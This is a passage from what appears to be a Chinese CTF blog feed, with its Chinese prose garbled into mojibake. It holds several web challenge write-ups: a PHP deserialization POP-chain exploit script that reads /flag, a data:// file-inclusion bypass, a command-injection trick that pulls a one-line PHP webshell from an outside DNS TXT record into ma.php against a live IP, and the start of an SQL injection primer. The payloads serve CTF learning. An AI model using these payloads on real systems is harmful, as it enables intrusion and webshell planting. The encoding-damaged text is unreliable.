class="hljs-string">&#x27;data&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œæˆ‘ä»¬å¿«é€Ÿæµè§ˆä¸€ä¸‹å„ä¸ªç±»çš„åŠŸèƒ½å’Œå¯èƒ½çš„åˆ©ç”¨ç‚¹ï¼š</p><ul><li><strong><code>cos1ne</code> ç±»</strong>: æœ‰ä¸€ä¸ª <code>__call</code> é­”æœ¯æ–¹æ³•ã€‚å½“è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³• <code>flag2</code> æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥ <code>$this-&gt;role</code> æ˜¯å¦æ˜¯ä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ï¼Œå¦‚æœæ˜¯ï¼Œå°±æ‰§è¡Œå®ƒã€‚è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„ â€œä»»æ„ä»£ç æ‰§è¡Œâ€ è·³æ¿ã€‚</li><li><strong><code>ziran</code> ç±»</strong>: ä¹Ÿæœ‰ä¸€ä¸ª <code>__call</code> é­”æœ¯æ–¹æ³•ã€‚å½“è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ï¼Œå®ƒä¼šè°ƒç”¨ <code>$this-&gt;data</code> å¯¹è±¡çš„ <code>flag2</code> æ–¹æ³•ã€‚è¿™å¯ä»¥ç”¨æ¥é“¾å¼è°ƒç”¨ã€‚</li><li><strong><code>Pr0</code> ç±»</strong>: æœ‰ä¸€ä¸ª <code>__toString</code> é­”æœ¯æ–¹æ³•ã€‚å½“è¿™ä¸ªç±»çš„å¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²å¤„ç†æ—¶ï¼Œå®ƒä¼šè°ƒç”¨ <code>$this-&gt;username</code> å¯¹è±¡çš„ <code>flag1</code> æ–¹æ³•ã€‚<code>__toString</code> æ˜¯ååºåˆ—åŒ–ä¸­éå¸¸å¸¸è§çš„è§¦å‘ç‚¹ï¼Œå› ä¸ºå¾ˆå¤šæ“ä½œï¼ˆå¦‚ echoã€æ‹¼æ¥å­—ç¬¦ä¸²ï¼‰éƒ½ä¼šéšå¼åœ°è°ƒç”¨å®ƒã€‚</li><li><strong><code>yi</code> ç±»</strong>: æœ‰ä¸€ä¸ª <code>__invoke</code> é­”æœ¯æ–¹æ³•ã€‚å½“å°è¯•å°†è¿™ä¸ªç±»çš„å¯¹è±¡å½“ä½œå‡½æ•°æ¥è°ƒç”¨æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥ <code>$this-&gt;username</code> å¯¹è±¡æ˜¯å¦å­˜åœ¨ <code>Acc1oFl4g</code> æ–¹æ³•ï¼Œå¦‚æœå­˜åœ¨ï¼Œå°±è°ƒç”¨å®ƒã€‚</li><li><strong><code>Acc1o</code> ç±»</strong>: è¿™æ˜¯æœ€ç»ˆçš„ç›®æ ‡ç±»ã€‚<ul><li>å®ƒæœ‰ä¸€ä¸ª <code>Acc1oFl4g</code> æ–¹æ³•ï¼Œå¯ä»¥è¯»å– <code>$this-&gt;key</code> æŒ‡å®šçš„æ–‡ä»¶å†…å®¹ã€‚æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯è®©è¿™ä¸ªæ–¹æ³•æ‰§è¡Œ <code>file_get_contents(&#39;/flag&#39;)</code>ã€‚</li><li>å®ƒè¿˜æœ‰ä¸€ä¸ª <code>__destruct</code> é­”æœ¯æ–¹æ³•ã€‚å½“å¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥ <code>md5($this-&gt;data)</code> æ˜¯å¦ç­‰äº <code>&#39;dislike&#39;</code>ã€‚è¿™ä¸ª <code>__destruct</code> æ–¹æ³•æœ¬èº«æ²¡æœ‰ç›´æ¥çš„å±å®³ï¼Œä½†å®ƒæ˜¯ååºåˆ—åŒ–é“¾çš„<strong>èµ·ç‚¹</strong>ï¼Œå› ä¸ºååºåˆ—åŒ–åï¼Œå¯¹è±¡ä¼šè¢«è‡ªåŠ¨é”€æ¯ï¼Œä»è€Œè§¦å‘ <code>__destruct</code>ã€‚</li></ul></li></ul><p><strong>å…³é”®é—®é¢˜ï¼š</strong> <code>Acc1o</code> ç±»çš„ <code>__destruct</code> æ–¹æ³•ä¼¼ä¹åªæ˜¯åšäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œå¹¶æ²¡æœ‰è§¦å‘ä»»ä½•å…¶ä»–é­”æœ¯æ–¹æ³•ã€‚æˆ‘ä»¬å¦‚ä½•ä»è¿™é‡Œå¼€å§‹ï¼Œæ„å»ºä¸€æ¡èƒ½å¤Ÿåˆ°è¾¾ <code>Acc1oFl4g</code> æ–¹æ³•çš„è°ƒç”¨é“¾å‘¢ï¼Ÿ</p><p>è®©æˆ‘ä»¬æ¢ä¸ªæ€è·¯ã€‚å¦‚æœ <code>$this-&gt;data</code> æœ¬èº«æ˜¯ä¸€ä¸ªå¯¹è±¡å‘¢ï¼Ÿå½“ <code>md5($this-&gt;data)</code> æ‰§è¡Œæ—¶ï¼Œ<code>md5</code> å‡½æ•°éœ€è¦ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å®ƒä¼šå°è¯•å°† <code>$this-&gt;data</code> å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œè¿™å°±ä¼šè§¦å‘è¯¥å¯¹è±¡çš„ <code>__toString</code> æ–¹æ³•ï¼</p><h3 id="æ„å»ºåˆ©ç”¨é“¾"><a href="#æ„å»ºåˆ©ç”¨é“¾" class="headerlink" title="æ„å»ºåˆ©ç”¨é“¾"></a>æ„å»ºåˆ©ç”¨é“¾</h3><p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯è°ƒç”¨ <code>Acc1o</code> ç±»çš„ <code>Acc1oFl4g</code> æ–¹æ³•ï¼Œå¹¶è®©å®ƒçš„ <code>$key</code> å±æ€§ä¸º <code>/flag</code>ã€‚</p><p>æˆ‘ä»¬å¯ä»¥æ„å»ºå¦‚ä¸‹çš„è°ƒç”¨é“¾ï¼š</p><ol><li><strong>èµ·ç‚¹ (<code>Acc1o-&gt;__destruct</code>)</strong>: ååºåˆ—åŒ–åï¼Œ<code>Acc1o</code> å¯¹è±¡è¢«é”€æ¯ï¼Œè§¦å‘ <code>__destruct</code>ã€‚</li><li><strong>è§¦å‘ç‚¹ (<code>Pr0-&gt;__toString</code>)</strong>: åœ¨ <code>__destruct</code> ä¸­ï¼Œ<code>md5($this-&gt;data)</code> è¢«æ‰§è¡Œã€‚æˆ‘ä»¬è®© <code>$this-&gt;data</code> æŒ‡å‘ä¸€ä¸ª <code>Pr0</code> å¯¹è±¡ã€‚<code>md5</code> å‡½æ•°éœ€è¦å­—ç¬¦ä¸²ï¼Œå› æ­¤è°ƒç”¨ <code>Pr0</code> å¯¹è±¡çš„ <code>__toString</code> æ–¹æ³•ã€‚</li><li><strong>é“¾æ¥ç€ (<code>ziran-&gt;__call</code>)</strong>: åœ¨ <code>Pr0-&gt;__toString</code> ä¸­ï¼Œä»£ç å°è¯•è°ƒç”¨ <code>$this-&gt;username-&gt;flag1()</code>ã€‚<code>flag1</code> æ–¹æ³•ä¸å­˜åœ¨ï¼Œæ‰€ä»¥ä¼šè§¦å‘ <code>$this-&gt;username</code> å¯¹è±¡çš„ <code>__call</code> æ–¹æ³•ã€‚æˆ‘ä»¬è®© <code>$this-&gt;username</code> æŒ‡å‘ä¸€ä¸ª <code>ziran</code> å¯¹è±¡ã€‚</li><li><strong>é“¾æ¥ç€ (<code>cos1ne-&gt;__call</code>)</strong>: åœ¨ <code>ziran-&gt;__call</code> ä¸­ï¼Œä»£ç è°ƒç”¨ <code>$this-&gt;data-&gt;flag2()</code>ã€‚<code>flag2</code> æ–¹æ³•ä¸å­˜åœ¨ï¼Œæ‰€ä»¥ä¼šè§¦å‘ <code>$this-&gt;data</code> å¯¹è±¡çš„ <code>__call</code> æ–¹æ³•ã€‚æˆ‘ä»¬è®© <code>$this-&gt;data</code> æŒ‡å‘ä¸€ä¸ª <code>cos1ne</code> å¯¹è±¡ã€‚</li><li><strong>é“¾æ¥ç€ (<code>yi-&gt;__invoke</code>)</strong>: åœ¨ <code>cos1ne-&gt;__call</code> ä¸­ï¼Œä»£ç æ£€æŸ¥ <code>$this-&gt;role</code> æ˜¯å¦æ˜¯å¯è°ƒç”¨çš„ï¼Œå¹¶æ‰§è¡Œå®ƒã€‚æˆ‘ä»¬è®© <code>$this-&gt;role</code> æŒ‡å‘ä¸€ä¸ª <code>yi</code> å¯¹è±¡ã€‚å°†å¯¹è±¡å½“ä½œå‡½æ•°è°ƒç”¨ä¼šè§¦å‘å…¶ <code>__invoke</code> æ–¹æ³•ã€‚</li><li><strong>ç»ˆç‚¹ (<code>Acc1o-&gt;Acc1oFl4g</code>)</strong>: åœ¨ <code>yi-&gt;__invoke</code> ä¸­ï¼Œä»£ç è°ƒç”¨ <code>$this-&gt;username-&gt;Acc1oFl4g()</code>ã€‚æˆ‘ä»¬è®© <code>$this-&gt;username</code> æŒ‡å‘æˆ‘ä»¬æœ€åˆçš„é‚£ä¸ª <code>Acc1o</code> å¯¹è±¡ï¼ˆæˆ–è€…å¦ä¸€ä¸ªé…ç½®å¥½çš„ <code>Acc1o</code> å¯¹è±¡ï¼‰ã€‚è¿™ä¸ªæ–¹æ³•ä¼šè¯»å– <code>$key</code> æ–‡ä»¶ã€‚</li></ol><p><strong>é“¾æ¡æ€»ç»“ï¼š</strong><code>Acc1o-&gt;__destruct</code> -&gt; <code>Pr0-&gt;__toString</code> -&gt; <code>ziran-&gt;__call</code> -&gt; <code>cos1ne-&gt;__call</code> -&gt; <code>yi-&gt;__invoke</code> -&gt; <code>Acc1o-&gt;Acc1oFl4g</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Acc1o</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$role</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">yi</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$role</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cos1ne</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$role</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ziran</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$role</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$temp</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pr0</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>&#125;<br><br><span class="hljs-comment">// åˆ›å»º Acc1o ä¸»å®ä¾‹</span><br><span class="hljs-variable">$acc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Acc1o</span>(<span class="hljs-string">&quot;user&quot;</span>);<br><span class="hljs-variable">$acc</span>-&gt;key = <span class="hljs-string">&quot;/flag&quot;</span>; <span class="hljs-comment">// æˆ– &quot;/etc/passwd&quot; æµ‹è¯•</span><br><br><span class="hljs-comment">// åˆ›å»º yiï¼Œå¼•ç”¨åŒä¸€ä¸ª $acc</span><br><span class="hljs-variable">$y</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">yi</span>();<br><span class="hljs-variable">$y</span>-&gt;username = <span class="hljs-variable">$acc</span>;<br><br><span class="hljs-comment">// cos1ne -&gt; role = yi</span><br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cos1ne</span>();<br><span class="hljs-variable">$c</span>-&gt;role = <span class="hljs-variable">$y</span>;<br><br><span class="hljs-comment">// ziran -&gt; data = cos1ne</span><br><span class="hljs-variable">$z</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ziran</span>();<br><span class="hljs-variable">$z</span>-&gt;data = <span class="hljs-variable">$c</span>;<br><br><span class="hljs-comment">// Pr0 -&gt; username = ziran</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pr0</span>();<br><span class="hljs-variable">$p</span>-&gt;username = <span class="hljs-variable">$z</span>;<br><span class="hljs-variable">$p</span>-&gt;password = <span class="hljs-string">&quot;123&quot;</span>;<br><br><span class="hljs-comment">// å…³é”®ï¼šAcc1o-&gt;data = Pr0ï¼Œè¿™æ · __destruct æ—¶ä¼šè§¦å‘ __toString</span><br><span class="hljs-variable">$acc</span>-&gt;data = <span class="hljs-variable">$p</span>;<br><br><span class="hljs-comment">// åºåˆ—åŒ–ä¸»å¯¹è±¡</span><br><span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$acc</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Payload:\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$payload</span> . <span class="hljs-string">&quot;\n\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;URL Encoded:\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$payload</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br></code></pre></td></tr></table></figure><h4 id="å‚è€ƒæ–‡çŒ®-4"><a href="#å‚è€ƒæ–‡çŒ®-4" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h4><p><a href="/html/phpfanxulie.html">ååºåˆ—åŒ–æ¼æ´è¯¦è§£</a></p><h1 id="fuzzing-whatï¼Ÿ"><a href="#fuzzing-whatï¼Ÿ" class="headerlink" title="fuzzing whatï¼Ÿ"></a>fuzzing whatï¼Ÿ</h1><p>æ ¹æ®é¢˜ç›®åç§°åº”è¯¥æ˜¯è¦è¿›è¡Œçˆ†ç ´</p><p><a href="https://github.com/TheKingOfDuck/fuzzDicts/tree/master">TheKingOfDuck&#x2F;fuzzDicts: You Know, For WEB Fuzzing ! æ—¥ç«™ç”¨çš„å­—å…¸ã€‚</a></p><p>å‚æ•°çˆ†ç ´ filename&#x3D;1æ—¶è·å¾—æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>) === <span class="hljs-string">&#x27;hello, hacker&#x27;</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/hello, hacker/&#x27;</span>, <span class="hljs-variable">$a</span>)) &#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable">$b</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;no you r not hacker&#x27;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;what?&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å½“<code>!preg_match(&#39;/hello, hacker/&#39;, $a)</code> æ—¶è§¦å‘æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä½†å‰é¢å¯¹aè¿›è¡Œäº†æ­£åˆ™è¿‡æ»¤</p><p><code>data://</code> ä¼ªåè®®å…è®¸ä½ åœ¨ URL ä¸­ç›´æ¥åµŒå…¥æ•°æ®ã€‚å½“ <code>file_get_contents</code> è¯»å–å®ƒæ—¶ï¼Œå®ƒä¼šå°†åµŒå…¥çš„æ•°æ®ä½œä¸ºæ–‡ä»¶å†…å®¹è¿”å›ã€‚</p><p><code>a=data://text/plain;base64,aGVsbG8sIGhhY2tlcg==</code> </p><h1 id="ez-blog"><a href="#ez-blog" class="headerlink" title="ez_blog"></a>ez_blog</h1><p><img src="https://pic1.imgdb.cn/item/693e2078fe7cfeca3824ad63.jpg"></p><h4 id="å‚è€ƒæ–‡çŒ®-5"><a href="#å‚è€ƒæ–‡çŒ®-5" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h4><p><a href="/html/userini.html">CTFä¹‹æ–‡ä»¶ä¸Šä¼ ï¼ˆ.user.iniï¼‰_ctf web2-CSDNåšå®¢</a></p><h1 id="ç§»èŠ±-challenge"><a href="#ç§»èŠ±-challenge" class="headerlink" title="ç§»èŠ±_challenge"></a>ç§»èŠ±_challenge</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$Pr0</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Pr0&#x27;</span>];<br><span class="hljs-variable">$mode</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;mode&#x27;</span>] ?? <span class="hljs-string">&#x27;ping&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpbrk</span>(<span class="hljs-variable">$Pr0</span>, <span class="hljs-string">&quot;&amp;;`|*?()$\\\x00&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;è¿™ä¸ªä¸å¯ä»¥å“¦~&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$Pr0</span>, <span class="hljs-string">&#x27;.php&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;è¿™ä¸ªä¹Ÿä¸å¯ä»¥å“¦~&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$Pr0</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$Pr0</span>);<br><span class="hljs-variable">$Pr0</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\&gt;&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-variable">$Pr0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$mode</span> === <span class="hljs-string">&#x27;nslookup&#x27;</span>) &#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;nslookup &quot;</span> . <span class="hljs-variable">$Pr0</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c1 &quot;</span> . <span class="hljs-variable">$Pr0</span>;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æœ‰nslookupå’Œpingä¸¤ç§æ¨¡å¼ï¼Œæ‰§è¡ŒPr0ä¸­çš„å‚æ•°ï¼Œä½†æ˜¯å¯¹Pr0è¿›è¡Œäº†ååˆ†ä¸¥æ ¼çš„è¿‡æ»¤ã€‚</p><p>é¦–å…ˆè¯•è¯•å‘½ä»¤æ‹¼æ¥ï¼Œè™½ç„¶ç‰¹æ®Šç¬¦å·è¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯å¯ä»¥å°è¯•ç”¨%0aå’Œ%0dåˆ†éš”å‘½ä»¤ï¼Œä¸è¿‡å®æµ‹ä¸è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$Pr0</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$Pr0</span>);<br><span class="hljs-variable">$Pr0</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\&gt;&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-variable">$Pr0</span>);<br></code></pre></td></tr></table></figure><p>å†åˆ†æè¿™æ®µä»£ç ï¼Œé¢˜ç›®ä¿ç•™äº†&gt;,å…è®¸æˆ‘ä»¬å°†å‘½ä»¤æ‰§è¡Œçš„ç»“æœé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶(ä½†ä¸å…è®¸.php)ã€‚</p><p>é‚£ä¹ˆé‡å®šå‘çš„æ„ä¹‰æ˜¯ä»€ä¹ˆï¼Œæ€ä¹ˆæ‰èƒ½æ‰§è¡Œæˆ‘æƒ³è¦çš„å‘½ä»¤ï¼Ÿæ€è·¯æ–­äº†</p><p>åç»­æˆ‘åˆç»“åˆnslookupçš„ç‰¹æ€§å°è¯•äº†dnslogå¤–å¸¦ï¼Œä¸è¿‡è¿˜æ˜¯å› ç‰¹æ®Šå­—ç¬¦è¿‡æ»¤è€Œå¤±è´¥ã€‚</p><p>åæ¥åæ¥ï¼Œä¸€é“è¿œç¨‹æ–‡ä»¶åŒ…å«çš„é¢˜ç›®ç»™äº†æˆ‘æ€è·¯ï¼Œæœ‰æ²¡æœ‰åŠæ³•è®©pingæˆ–è€…nslookupçš„ç»“æœé‡Œå¸¦æœ‰ä¸€å¥è¯æœ¨é©¬ï¼Ÿ</p><p>åªè¦åœ¨åŸŸåçš„è§£æä¸­æ·»åŠ ä¸€æ¡TXTè®°å½•å°±è¡Œäº†ï¼</p><p><img src="https://pic1.imgdb.cn/item/6933821dd1e741a32bf5e44a.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://175.27.251.122:33640/?mode=nslookup&amp;Pr0=-type=TXT%20webattacktest.libfsx.org<br></code></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/6933829dd1e741a32bf5e7a1.png"></p><p>ä¸‹ä¸€æ­¥ç»•è¿‡.phpè¿‡æ»¤ï¼Œé‡å®šå‘åˆ°ma.phpæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://175.27.251.122:33640/?mode=nslookup&amp;Pr0=-type=TXT%20webattacktest.libfsx.org%3Ema.p%27%27hp<br></code></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/693382f0d1e741a32bf5e9cd.png"></p><p>æˆåŠŸï¼</p><h4 id="å‚è€ƒæ–‡çŒ®-6"><a href="#å‚è€ƒæ–‡çŒ®-6" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h4><p><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/17705836.html">nmapå’Œescapeshellarg()å‡½æ•°ã€escapeshellcmd()å‡½æ•°çš„RCEä½¿ç”¨</a></p><p><a href="https://blog.csdn.net/m0_73512445/article/details/134873251">PHP escapeshellarg()+escapeshellcmd()ç»•è¿‡</a></p><p><a href="/html/dnslog.html">DNSlogå¤–å¸¦</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQLæ³¨å…¥</title>
    <link href="/2025/11/15/SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/11/15/SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¸€ã€SQL-æ³¨å…¥åŸºç¡€"><a href="#ä¸€ã€SQL-æ³¨å…¥åŸºç¡€" class="headerlink" title="ä¸€ã€SQL æ³¨å…¥åŸºç¡€"></a>ä¸€ã€SQL æ³¨å…¥åŸºç¡€</h2><p><strong>æ ¸å¿ƒåŸç†</strong>ï¼šç”¨æˆ·è¾“å…¥æœªç»è¿‡æ»¤ç›´æ¥æ‹¼æ¥åˆ° SQL è¯­å¥ä¸­ï¼Œå¯¼è‡´æ¶æ„ä»£ç è¢«æ‰§è¡Œã€‚  </p><p><strong>CTF å¸¸è§æ³¨å…¥ç±»å‹</strong>ï¼š</p><ul><li><strong>è”åˆæŸ¥è¯¢æ³¨å…¥ï¼ˆUNIONï¼‰</strong></li><li><strong>å¸ƒå°”ç›²æ³¨</strong></li><li><strong>æ—¶é—´ç›²æ³¨</strong></li><li><strong>æŠ¥é”™æ³¨å…¥</strong></li><li><strong>å †å æŸ¥è¯¢æ³¨å…¥</strong></li><li><strong>å®½å­—èŠ‚æ³¨å…¥</strong></li><li><strong>äºŒæ¬¡æ³¨å…¥</strong></li></ul><p><strong>å¸¸è§æ³¨å…¥ç‚¹</strong></p><ul><li><strong>GET å‚æ•°</strong>ï¼š<code>http://example.com/page.php?id=1</code></li><li><strong>POST å‚æ•°</strong>ï¼šç™»å½•æ¡†ã€æœç´¢æ¡†ã€ç•™è¨€æ¿ç­‰è¡¨å•æäº¤çš„å‚æ•°ã€‚</li><li><strong>Cookie</strong>ï¼š<code>Cookie: user=admin; session=abc123</code></li><li><strong>HTTP å¤´éƒ¨</strong>ï¼š<code>User-Agent</code>, <code>Referer</code>, <code>X-Forwarded-For</code> ç­‰ã€‚</li></ul><h2 